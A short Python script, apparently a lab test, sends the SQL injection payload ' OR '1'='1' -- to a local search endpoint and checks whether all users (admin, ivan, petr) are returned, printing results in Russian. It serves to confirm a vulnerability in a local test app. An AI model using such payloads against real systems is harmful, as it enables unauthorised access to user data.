from urllib.request import urlopen
from urllib.parse import urlencode


def test_sql_injection():
	payload = "' OR '1'='1' -- "
	params = urlencode({"username": payload})
	url = f"http://127.0.0.1:8000/search?{params}"

	with urlopen(url) as response:
		page = response.read().decode("utf-8")

	print("Ответ сервера:")
	print(page)

	if all(name.lower() in page.lower() for name in ("admin", "ivan", "petr")):
		print("\nУязвимость подтверждена: найдены все пользователи.")
	else:
		print("\nВсе пользователи не выведены.")


if __name__ == "__main__":
	test_sql_injection()
